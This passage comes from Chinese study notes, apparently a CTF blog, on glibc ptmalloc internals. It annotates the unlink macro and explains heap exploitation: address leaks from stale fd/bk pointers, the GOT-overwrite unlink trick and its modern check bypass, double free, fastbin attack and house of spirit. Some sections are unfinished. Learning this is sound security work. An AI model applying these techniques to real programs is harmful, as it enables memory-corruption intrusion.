&lt;li&gt;从比请求的 chunk 所在的large bin 中取 chunk。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;free&lt;/strong&gt;&lt;ul&gt;
&lt;li&gt;后向合并，合并物理相邻低地址空闲 chunk。&lt;/li&gt;
&lt;li&gt;前向合并，合并物理相邻高地址空闲 chunk（除了 top chunk）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;malloc_consolidate&lt;/strong&gt;：用于合并的时候要把空闲块取出来先。&lt;ul&gt;
&lt;li&gt;后向合并，合并物理相邻低地址空闲 chunk。&lt;/li&gt;
&lt;li&gt;前向合并，合并物理相邻高地址空闲 chunk（除了 top chunk）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;realloc&lt;/strong&gt;&lt;ul&gt;
&lt;li&gt;前向扩展，合并物理相邻高地址空闲 chunk（除了 top chunk）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre class=&#34;line-numbers language-c&#34; data-language=&#34;c&#34;&gt;&lt;code class=&#34;language-c&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;/* Take a chunk off a bin list */&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;// unlink p&lt;/span&gt;
&lt;span class=&#34;token macro property&#34;&gt;&lt;span class=&#34;token directive-hash&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;token directive keyword&#34;&gt;define&lt;/span&gt; &lt;span class=&#34;token macro-name function&#34;&gt;unlink&lt;/span&gt;&lt;span class=&#34;token expression&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;AV&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; P&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; BK&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; FD&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;  &lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;//这里FD是前面的chunk，BK是后面的chunk,传入的BK和FD是空指针          \
    // 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。&lt;/span&gt;&lt;/span&gt;
	&lt;span class=&#34;token comment&#34;&gt;// 这两个位置分别是下一个chunk的prevsize和他自己记录的chunksize大小&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;__builtin_expect&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;chunksize&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;P&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;prev_size&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;next_chunk&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;P&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;      \
      &lt;span class=&#34;token function&#34;&gt;malloc_printerr&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;corrupted size vs. prev_size&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;               \
    FD &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; P&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;fd&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;                                                                      \
    BK &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; P&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;bk&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;                                                                      \
    &lt;span class=&#34;token comment&#34;&gt;// 此处才真正的取出FD和BK两个chunk块&lt;/span&gt;
    &lt;span class=&#34;token comment&#34;&gt;// 防止攻击者简单篡改空闲的 chunk 的 fd 与 bk 来实现任意写的效果。&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;__builtin_expect&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;FD&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;bk &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; P &lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt; BK&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;fd &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; P&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;                    \ &lt;span class=&#34;token comment&#34;&gt;// 看看取出的目标块是不是真正的目标&lt;/span&gt;
      &lt;span class=&#34;token function&#34;&gt;malloc_printerr&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;check_action&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;corrupted double-linked list&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; P&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; AV&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  \
    &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;                                                                      \
        FD&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;bk &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; BK&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;                                                              \
        BK&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;fd &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; FD&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;   &lt;span class=&#34;token comment&#34;&gt;// 此处主要是将P排除在外，让前后块进行连接                 \
        // 下面主要考虑 P 对应的 nextsize 双向链表的修改&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;in_smallbin_range&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;chunksize_nomask&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;P&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;                              \
            &lt;span class=&#34;token comment&#34;&gt;// 如果P-&amp;gt;fd_nextsize为 NULL，表明 P 未插入到 nextsize 链表中。&lt;/span&gt;
            &lt;span class=&#34;token comment&#34;&gt;// 那么其实也就没有必要对 nextsize 字段进行修改了。&lt;/span&gt;
            &lt;span class=&#34;token comment&#34;&gt;// 这里没有去判断 bk_nextsize 字段，可能会出问题。&lt;/span&gt;
            &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__builtin_expect&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;P&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;fd_nextsize &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;                      \
            &lt;span class=&#34;token comment&#34;&gt;// 类似于小的 chunk 的检查思路&lt;/span&gt;
            &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;__builtin_expect&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;P&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;fd_nextsize&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;bk_nextsize &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; P&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;              \
                &lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__builtin_expect&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;P&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;bk_nextsize&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;fd_nextsize &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; P&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;    \
              &lt;span class=&#34;token function&#34;&gt;malloc_printerr&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;check_action&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;                                      \
                               &lt;span class=&#34;token string&#34;&gt;&#34;corrupted double-linked list (not small)&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;    \
                               P&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; AV&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;                                              \
            &lt;span class=&#34;token comment&#34;&gt;// 这里说明 P 已经在 nextsize 链表中了。&lt;/span&gt;
            &lt;span class=&#34;token comment&#34;&gt;// 如果 FD 没有在 nextsize 链表中&lt;/span&gt;
            &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;FD&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;fd_nextsize &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;                                      \
                &lt;span class=&#34;token comment&#34;&gt;// 如果 nextsize 串起来的双链表只有 P 本身，那就直接拿走 P&lt;/span&gt;
                &lt;span class=&#34;token comment&#34;&gt;// 令 FD 为 nextsize 串起来的&lt;/span&gt;
                &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;P&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;fd_nextsize &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; P&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;                                      \
                  FD&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;fd_nextsize &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; FD&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;bk_nextsize &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; FD&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;                      \
                &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;                                                              \
                &lt;span class=&#34;token comment&#34;&gt;// 否则我们需要将 FD 插入到 nextsize 形成的双链表中&lt;/span&gt;
                    FD&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;fd_nextsize &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; P&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;fd_nextsize&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;                              \
                    FD&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;bk_nextsize &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; P&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;bk_nextsize&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;                              \
                    P&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;fd_nextsize&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;bk_nextsize &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; FD&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;                              \
                    P&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;bk_nextsize&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;fd_nextsize &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; FD&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;                              \
                  &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;                                                              \
              &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;                                                              \
                &lt;span class=&#34;token comment&#34;&gt;// 如果在的话，直接拿走即可&lt;/span&gt;
                P&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;fd_nextsize&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;bk_nextsize &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; P&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;bk_nextsize&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;                      \
                P&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;bk_nextsize&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;fd_nextsize &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; P&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;fd_nextsize&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;                      \
              &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;                                                                      \
          &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;                                                                      \
      &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;                                                                              \
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;注意：以上操作有个Bug、就是其只是对P前后的内容进行了处理，也就是只对链进行了处理，但是并没有对P本身这个块进行任何的处理。也就是P-&amp;gt;fd,和P-&amp;gt;bk两个指针中还是存储着地址值的。因此可以利用这个地址进行libc地址的泄露&lt;/li&gt;
&lt;li&gt;泄露思路：&lt;ul&gt;
&lt;li&gt;P 位于双向链表头部，bk 泄漏&lt;/li&gt;
&lt;li&gt;P 位于双向链表尾部，fd 泄漏&lt;/li&gt;
&lt;li&gt;双向链表只包含一个空闲 chunk 时，P 位于双向链表中，fd 和 bk 均可以泄漏（啥意思？双向链表的起始地址，及时libc的地址吗？？）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;泄露堆地址&lt;ul&gt;
&lt;li&gt;P 位于双向链表头部，fd 泄漏&lt;/li&gt;
&lt;li&gt;P 位于双向链表中，fd 和 bk 均可以泄漏&lt;/li&gt;
&lt;li&gt;P 位于双向链表尾部，bk 泄漏&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;注意：&lt;ul&gt;
&lt;li&gt;这里的头部指的是 bin 的 fd 指向的 chunk，即双向链表中最新加入的 chunk。&lt;/li&gt;
&lt;li&gt;这里的尾部指的是 bin 的 bk 指向的 chunk，即双向链表中最先加入的 chunk。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;堆的第一个 chunk 所记录的 prev_inuse 位默认为 1。&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;init-malloc函数&#34;&gt;&lt;a href=&#34;#init-malloc函数&#34; class=&#34;headerlink&#34; title=&#34;_init_malloc函数&#34;&gt;&lt;/a&gt;_init_malloc函数&lt;/h3&gt;&lt;p&gt;该函数是malloc申请内存的底层函数&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;它根据用户申请的&lt;strong&gt;内存块大小&lt;/strong&gt;以及&lt;strong&gt;相应大小 chunk 通常使用的频度&lt;/strong&gt;（fastbin chunk, small chunk, large chunk），依次实现了不同的分配方法。&lt;/li&gt;
&lt;li&gt;它由小到大依次检查不同的 bin 中是否有相应的空闲块可以满足用户请求的内存。&lt;/li&gt;
&lt;li&gt;当所有的空闲 chunk 都无法满足时，它会考虑 top chunk。&lt;/li&gt;
&lt;li&gt;当 top chunk 也无法满足时，堆分配器才会进行内存块申请。&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;注意一点，所有的数据进入malloc之后全部都会被转化为无符号整数。&lt;/li&gt;
&lt;li&gt;当 fast bin、small bin 中的 chunk 都不能满足用户请求 chunk 大小时，就会考虑是不是 large bin。但是，其实在 large bin 中并没有直接去扫描对应 bin 中的 chunk，而是先利用 malloc_consolidate（参见 malloc_state 相关函数） 函数处理 fast bin 中的 chunk，将有可能能够合并的 chunk 先进行合并后放到 unsorted bin 中，不能够合并的就直接放到 unsorted bin 中，然后再在下面的大循环中进行相应的处理。&lt;strong&gt;为什么不直接从相应的 bin 中取出 large chunk 呢？这是 ptmalloc 的机制，它会在分配 large chunk 之前对堆中碎片 chunk 进行合并，以便减少堆中的碎片。&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;堆溢出常见攻击手段&#34;&gt;&lt;a href=&#34;#堆溢出常见攻击手段&#34; class=&#34;headerlink&#34; title=&#34;堆溢出常见攻击手段&#34;&gt;&lt;/a&gt;堆溢出常见攻击手段&lt;/h2&gt;&lt;p&gt;&lt;img data-src=&#34;/HEAP-EXP-heap-management.assets/image-20230625155220102.png&#34; alt=&#34;image-20230625155220102&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;堆溢出&#34;&gt;&lt;a href=&#34;#堆溢出&#34; class=&#34;headerlink&#34; title=&#34;堆溢出&#34;&gt;&lt;/a&gt;堆溢出&lt;/h3&gt;&lt;p&gt;​	堆溢出的本质可以类比栈溢出的内容，堆溢出的本质是从用户缓冲区向下溢出到下一个堆块中，如果溢出长度够长，甚至能够重写下一个堆块中的内容。&lt;/p&gt;
&lt;h3 id=&#34;double-free&#34;&gt;&lt;a href=&#34;#double-free&#34; class=&#34;headerlink&#34; title=&#34;double free&#34;&gt;&lt;/a&gt;double free&lt;/h3&gt;&lt;p&gt;​	double free漏洞的本质是将当前对应块的指针做二次的free操作。对同一个块进行两次free操作，则该块会被加入到bin链两次，那么在后续进行多次malloc时会出现指针相同的情况&lt;/p&gt;
&lt;h3 id=&#34;unlink-1&#34;&gt;&lt;a href=&#34;#unlink-1&#34; class=&#34;headerlink&#34; title=&#34;unlink&#34;&gt;&lt;/a&gt;unlink&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;unlink的作用是将free时，操作双向链表中相邻的两个free chunk进行合并操作。&lt;/li&gt;
&lt;li&gt;注意事项:unlink不发生在&lt;em&gt;fastbin和smallbin&lt;/em&gt;中,所以fastbin和smallbin容易产生漏洞。fastbin使用单向链表进行存储&lt;/li&gt;
&lt;li&gt;unlink本身存在一些检查&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;unlink首先检查当前内存空间中该块的相邻块是否空闲，并且检查当前的块大小和下一个块记录的prev_size大小是否相同，如果空闲则进行合并操作。&lt;/p&gt;
&lt;p&gt;unlink的代码中实现的操作就是将当前程序中的某个chunk从双向链表中取出来，下面的代码以当前要取出的块是p为例。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-c&#34; data-language=&#34;c&#34;&gt;&lt;code class=&#34;language-c&#34;&gt;FD &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; p&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;fd&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
BK &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; p&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;bk&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
FD&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;bk &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; BK&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
BK&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;fd &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; FD&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;// 其实就是传统的双向链表取元素的操作&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;/*
	上述操作中，当前块的fd和bk是可以被伪造的。
	假设此刻将两个地址分别重写为got[free], 和shellcode地址
	执行前两条指令后。
	FD = got[free] - 12（32位机器）
	BK = shellcode  // 这里BK要加fd，所以不需要存储
	执行第三条指令，将got表中的地址写为shellcode地址，从而实现got表劫持
	但是这个方法在新版libc里没有用！！！
*/&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;​	unlink之前需要进行一些简单的检查，这个检查是可以欺骗的：&lt;/p&gt;
&lt;p&gt;​	fd的偏移是3个机器位数，bk的偏移是4个机器位数。即在64位机器上，fd是8*3=24字节，bk是8*4=32字节；32位机器上，fd是4 *3 =12字节，bk是4*4=16字节。设伪空闲堆块的堆块头指针是p，那么需要检查：p-&amp;gt;bk-&amp;gt;fd==p &amp;amp;&amp;amp; p-&amp;gt;fd-&amp;gt;bk==p, 只需要保证满足 fd = &amp;amp;p - 3*size(int); bk = &amp;amp;p - 2*size(int) 即可。&lt;/p&gt;
&lt;p&gt;​	&lt;strong&gt;也就是说&lt;/strong&gt;：在新版的glibc中，使用另一种思路，依赖于一个UAF漏洞，对一个已经free的堆块进行修改。假设想要修改的内存是ptr，那么就修改这p中fd = &amp;amp;ptr - 3*size(int); bk = &amp;amp;ptr- 2*size(int) ，在检查的过程中BK-&amp;gt;fd = FD-&amp;gt;BK = ptr。 最终在执行完unlink操作后，ptr变为了ptr-0x18（其实也就是最后一条指令的作用），但是同样新版的unlink也会修改&lt;/p&gt;
&lt;h4 id=&#34;例题-0CTF2015-freenote&#34;&gt;&lt;a href=&#34;#例题-0CTF2015-freenote&#34; class=&#34;headerlink&#34; title=&#34;例题 0CTF2015 freenote&#34;&gt;&lt;/a&gt;例题 0CTF2015 freenote&lt;/h4&gt;&lt;p&gt;​	&lt;/p&gt;
&lt;h3 id=&#34;fastbin-attack&#34;&gt;&lt;a href=&#34;#fastbin-attack&#34; class=&#34;headerlink&#34; title=&#34;fastbin attack&#34;&gt;&lt;/a&gt;fastbin attack&lt;/h3&gt;&lt;h4 id=&#34;攻击原理&#34;&gt;&lt;a href=&#34;#攻击原理&#34; class=&#34;headerlink&#34; title=&#34;攻击原理&#34;&gt;&lt;/a&gt;攻击原理&lt;/h4&gt;&lt;p&gt;fastbin是一种简单的单向链表，用于存储大小小于等于0x80（默认情况下）的已经释放的堆块。Fastbin attack的基本原理是利用fastbin链表的机制，通过伪造堆块的头部，使得堆分配器将伪造的堆块地址返回给程序，从而控制被释放的堆块的指针。攻击者可以通过覆盖被释放的堆块的指针，实现任意地址写或者控制流劫持。&lt;/p&gt;
&lt;h4 id=&#34;house-of-spirit&#34;&gt;&lt;a href=&#34;#house-of-spirit&#34; class=&#34;headerlink&#34; title=&#34;house of spirit&#34;&gt;&lt;/a&gt;house of spirit&lt;/h4&gt;&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvODUzNTc=&#34;&gt;https://www.anquanke.com/post/id/85357&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;house of sporit与double free存在相似之处，二者的区别free掉的块一个指向真正被malloc的过的内存，而另一个则是构造一个完全虚假的内存块，并且包含精心构造的chunk数据结构&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;tcache-attack&#34;&gt;&lt;a href=&#34;#tcache-attack&#34; class=&#34;headerlink&#34; title=&#34;tcache attack&#34;&gt;&lt;/a&gt;tcache attack&lt;/h3&gt;&lt;p&gt;tcache本身是单向链表，并且一个线程对应一个tcache存在。&lt;/p&gt;
